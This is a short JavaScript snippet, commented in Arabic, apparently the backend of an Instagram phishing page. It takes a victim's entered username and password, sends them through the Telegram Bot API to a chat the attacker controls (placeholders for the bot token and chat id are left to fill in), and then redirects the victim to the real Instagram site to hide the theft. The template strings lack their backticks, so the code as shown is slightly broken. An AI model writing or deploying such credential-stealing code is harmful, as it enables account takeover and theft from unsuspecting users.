// بيانات البوت الخاصة بك
const token = "ضع_هنا_توكن_البوت_الخاص_بك";
const chat_id = "ضع_هنا_رقم_ايدي_حسابك";

// الكود الذي يرسل البيانات
const message = تم تسجيل دخول جديد:\nUsername: ${email}\nPassword: ${password};
const url = https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)};

fetch(url).then(response => {
    if(response.ok) {
        // إذا نجح الإرسال، يمكنك تحويل المستخدم لصفحة إنستغرام الحقيقية
        window.location.href = "https://www.instagram.com";
    }
});
